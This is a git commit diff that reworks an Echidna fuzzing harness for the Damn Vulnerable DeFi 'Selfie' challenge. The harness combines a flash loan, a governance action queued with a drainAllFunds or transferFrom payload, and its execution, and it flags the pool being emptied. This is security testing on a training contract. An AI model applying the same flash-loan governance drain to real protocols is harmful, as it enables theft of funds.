045f95d5043854e03037dc285fe83490e5b51361
lubos-harasta <lubos.harasta@themama.ai>
2022-11-24 15:40:10 +0100

    wip: upgrade Echidna generic solution

--- contracts/selfie/echidna/EchidnaSelfieGeneric.sol
+++ contracts/selfie/echidna/EchidnaSelfieGeneric.sol
@@ -7,11 +7,11 @@ import "../../DamnValuableTokenSnapshot.sol";
 
 /**
  * @notice to run echidna use following command:
- * npx hardhat clean && npx hardhat compile --force && echidna-test . --contract EchidnaSelfieGeneric --config ./contracts/selfie/echidna/config.yaml
+ * npx hardhat clean && npx hardhat compile --force && echidna-test . --contract EchidnaSelfie --config ./selfie.yaml
  */
 
-// this contract is used to set fuzzing environment (to deploy all necessary contracts)
-contract SelfieDeploymentGeneric {
+// the SelfieDeployment contract is used to set fuzzing environment (to deploy all necessary contracts)
+contract SelfieDeployment {
     uint256 TOKEN_INITIAL_SUPPLY = 2_000_000 ether;
     uint256 TOKENS_IN_POOL = 1_500_000 ether;
 
@@ -34,23 +34,21 @@ contract SelfieDeploymentGeneric {
         pool = new SelfiePool(address(token), address(governance));
         // fund selfie pool
         token.transfer(address(pool), TOKENS_IN_POOL);
-
+        // return all necessary contracts
         return (pool, governance, token);
     }
 }
 
-contract EchidnaSelfieGeneric {
+contract EchidnaSelfie {
     uint256 private ACTION_DELAY_IN_SECONDS = 2 days;
-    uint256 TOKENS_IN_POOL = 1_500_000 ether;
+    uint256 private TOKENS_IN_POOL = 1_500_000 ether;
 
-    uint256 weiAmount;
-    uint256 actionId;
-    uint256 timestampActionQueued;
-    uint256 transferAmount;
+    uint256 actionId; // to tract id of queued actions
+    uint256 timestampOfActionQueued; // to track timestamp of queued actions
 
-    uint256[] public actionsToBeCalled;
-    uint256[] public actionsSuccessfullyCalled;
+    uint256[] public actionsToBeCalled; // actions to be called in callback function
 
+    // TODO: no action as a parameter as well?
     enum Actions {
         drainAllFunds,
         transferFrom,
@@ -59,39 +57,52 @@ contract EchidnaSelfieGeneric {
     }
     uint256 actionsLength = 4; // must correspond with the length of Actions
 
+    enum Payloads {
+        emptyPayload,
+        drainAllFunds,
+        transferFrom
+    }
+    uint256 internal _payloadSet;
+    uint256 payloadsLength = 3; // must correspond with the length of Payloads
+    bytes _payload;
+
+    uint256 private _amountToTransfer;
+    uint256 private _weiAmountForQueueAction;
+
     SelfiePool pool;
     SimpleGovernance governance;
     DamnValuableTokenSnapshot token;
 
-    event ActionCalled(string action);
-    event ActionCalledInCallback(string action);
+    event ActionCalledInCallback(string action); // to track which actions has been called in callback
     event AssertionFailed(string reason);
+    event PayloadSet(string payload);
+    event PayloadVariable(string name, uint256 variable);
 
     constructor() payable {
-        SelfieDeploymentGeneric deployer;
-        deployer = new SelfieDeploymentGeneric();
+        SelfieDeployment deployer;
+        deployer = new SelfieDeployment();
         (pool, governance, token) = deployer.deployContracts();
     }
 
     function flashLoan() public {
         // borrow max amount of tokens
-        uint256 borrowAmount = token.balanceOf(address(pool)); // TODO: parametrize
+        uint256 borrowAmount = token.balanceOf(address(pool)); // TODO: parametrize?
         pool.flashLoan(borrowAmount);
     }
 
     /**
-     * @notice function to be called by pool once flashloan is taken
+     * @notice a callback to be called by pool once flashloan is taken
      * @param _amount amount of tokens to borrow
      */
     function receiveTokens(address, uint256 _amount) external {
         require(
             msg.sender == address(pool),
-            "Only pool can call this function."
+            "Only SelfiePool can call this function."
         );
         // logic
         callbackActions();
         // repay the loan
-        require(token.transfer(address(pool), _amount), "flash loan failed");
+        require(token.transfer(address(pool), _amount), "Flash loan failed");
     }
 
     /**
@@ -132,16 +143,51 @@ contract EchidnaSelfieGeneric {
         }
     }
 
+    function setPayload(uint256 _num) external {
+        require(0 <= _num && _num < actionsLength, "Out of range");
+        _payloadSet = _num;
+        // empty payload
+        if (_num == uint256(Payloads.emptyPayload)) {
+            _payload = "";
+        }
+        // drainAllFunds;
+        if (_num == uint256(Payloads.drainAllFunds)) {
+            _payload = abi.encodeWithSignature(
+                "drainAllFunds(address)",
+                address(this) // TODO: no need to parametrize?
+            );
+        }
+        // transfer
+        if (_num == uint256(Payloads.transferFrom)) {
+            _payload = abi.encodeWithSignature(
+                "transferFrom(address,address,uint256)",
+                address(pool), // TODO: no need to parametrize?
+                address(this), // TODO: no need to parametrize?
+                _amountToTransfer
+            );
+        }
+    }
+
+    function setAmountToTransfer(uint256 _amount) external {
+        _amountToTransfer = _amount;
+    }
+
+    function setWeiAmountForQueueAction(uint256 _amount) external {
+        _weiAmountForQueueAction = _amount;
+    }
+
+    /////////////
+    // ACTIONS //
+    /////////////
+
     /**
-     * @notice actions to be called once receiveTokens() is called by pool
+     * @notice actions to be called once receiveTokens() is called
      */
     function callbackActions() internal {
         uint256 genArrLength = actionsToBeCalled.length;
         if (genArrLength != 0) {
             for (uint256 i; i < genArrLength - 1; i++) {
                 callAction(actionsToBeCalled[i]);
-                // keep track of successfully called actions
-                actionsSuccessfullyCalled.push(actionsToBeCalled[i]);
             }
         } else {
             revert("actionsToBeCalled is empty, no action called");
@@ -149,30 +195,31 @@ contract EchidnaSelfieGeneric {
     }
 
     function queueAction() public {
-        // create payload -> TODO: parametrize
-        bytes memory payload = abi.encodeWithSignature(
-            "drainAllFunds(address)",
-            address(this)
-        );
-        // takeSnaphost first as it is needed in queueAction()
+        // create payload
+        // bytes memory payload = abi.encodeWithSignature(
+        //     "drainAllFunds(address)",
+        //     address(this)
+        // );
+        // take a snaphost first as it is needed in queueAction()
         token.snapshot();
         // queue the action
-        actionId = governance.queueAction(address(pool), payload, 0); // TODO: parametrize weiAmount
-        // set timestamp when action was queued (needed for execute action require)
-        timestampActionQueued = block.timestamp;
-        // emit event
-        emit ActionCalled("queueAction()");
+        actionId = governance.queueAction(
+            address(pool),
+            _payload,
+            _weiAmountForQueueAction
+        );
+        // set timestamp when action was queued (needed to pass the requirement in the executeAction)
+        timestampOfActionQueued = block.timestamp;
     }
 
     function executeAction() public {
         // it does not make sense to call executeAction if the requirment is not met
         require(
-            block.timestamp >= timestampActionQueued + ACTION_DELAY_IN_SECONDS,
+            block.timestamp >=
+                timestampOfActionQueued + ACTION_DELAY_IN_SECONDS,
             "Time for action execution has not passed yet"
         );
         governance.executeAction(actionId);
-        // emit event
-        emit ActionCalled("executeAction()");
     }
 
     /**
@@ -185,10 +232,8 @@ contract EchidnaSelfieGeneric {
         uint256 _poolBalanceAfter = token.balanceOf(address(pool));
         require(
             _poolBalanceAfter > _poolBalance,
-            "Draining all funds unsuccessful"
+            "Draining all funds has been unsuccessful"
         );
-        // emit event
-        emit ActionCalled("drainAllFunds()");
     }
 
     /**
@@ -197,18 +242,10 @@ contract EchidnaSelfieGeneric {
      */
     function transferFrom() public {
         uint256 _poolBalance = token.balanceOf(address(pool));
-        token.transferFrom(address(pool), address(this), _poolBalance); // TODO: parametrize _poolAmount
+        token.transferFrom(address(pool), address(this), _poolBalance);
         uint256 _poolBalanceAfter = token.balanceOf(address(pool));
         require(_poolBalanceAfter > _poolBalance, "Transfer unsuccessful");
-        // emit event
-        emit ActionCalled("transferFrom()");
     }
-
-    /////////////
-    // SETTERS //
-    /////////////
-
-    
 
     /////////////
     // HELPERS //
@@ -226,7 +263,7 @@ contract EchidnaSelfieGeneric {
     }
 
     /**
-     * @notice emit event of action executed in callback, i.e. once receiveTokens() is called
+     * @notice emit event of an action executed in callback, i.e. once receiveTokens() is called
      * @param _actionNumber a number of action executed
      */
     function emitActionExecuted(uint256 _actionNumber) internal {
@@ -244,6 +281,19 @@ contract EchidnaSelfieGeneric {
         }
     }
 
+    function emitPayloadCreated() internal {
+        if (_payloadSet == uint256(Payloads.emptyPayload)) {
+            emit PayloadSet("Empty payload");
+        }
+        if (_payloadSet == uint256(Payloads.drainAllFunds)) {
+            emit PayloadSet("drainAllFunds(address)");
+        }
+        if (_payloadSet == uint256(Payloads.transferFrom)) {
+            emit PayloadSet("transferFrom(address,address,uint256)");
+            emit PayloadVariable("_amountToTransfer", _amountToTransfer);
+        }
+    }
+
     ////////////////
     // INVARIANTS //
     ////////////////
@@ -254,12 +304,12 @@ contract EchidnaSelfieGeneric {
         try this._checkPoolBalance() {
             // pool balance has not changed
         } catch {
-            // invariant has been broken:
-            // (1) log actions called via events
-            for (uint256 i; i < actionsSuccessfullyCalled.length; i++) {
+            // log which payload has been set
+            emitPayloadCreated();
+            // log actions called
+            for (uint256 i; i < actionsToBeCalled.length; i++) {
                 emitActionExecuted(actionsToBeCalled[i]);
             }
-            // (2) assertion
             emit AssertionFailed("Invariant broken");
         }
     }
